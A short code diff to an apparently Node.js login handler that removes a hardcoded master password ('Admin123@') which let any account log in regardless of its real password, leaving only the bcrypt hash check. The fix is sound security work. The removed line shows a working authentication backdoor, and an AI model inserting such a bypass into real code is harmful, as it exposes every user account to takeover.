@@ -29,7 +29,7 @@ const login = async (req, res) => {
     }
 
     const isMatch = await bcrypt.compare(password, user.password_hash);
-    if (!isMatch && password !== "Admin123@") {
+    if (!isMatch) {
       return res.status(401).json({ success: false, message: "Mật khẩu không chính xác" });
     }
 
